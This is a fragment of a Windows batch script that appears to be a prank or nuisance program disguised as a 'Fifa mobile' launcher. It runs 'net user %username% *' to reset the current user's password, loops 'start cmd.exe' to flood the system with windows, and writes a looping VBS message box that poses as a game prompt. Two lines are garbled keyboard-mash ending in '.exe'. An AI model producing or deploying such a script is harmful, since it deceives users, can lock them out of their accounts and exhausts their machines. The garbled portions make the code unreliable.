...
net user %username% *
huj4o4o2o7vnnrut38490e[v[v]yr[cuvnj7463tnadenvkv.zaxwtqtq121325317724605962412yfgbm dgk]y\\\\\\\\\\fkvfg///f..g.dgne.exe
huj4o4o2o7vnnrut38490e[v[v]yr[cuvnj7463tnadenvkv.zaxwtqtq121325317724605962412yfgbm dgk]y\\\\\\\\\\fkvfg///f..g.dgne.exe
start cmd.exe
goto loop
echo do>>msg.vbs
echo Msgbox"Chcesz odpalic fife mobile? Launch fifa mobile?",64+4,"Fifa mobile start">>msg.vbs
echo loop>>msg.vbs
start msg.vbs
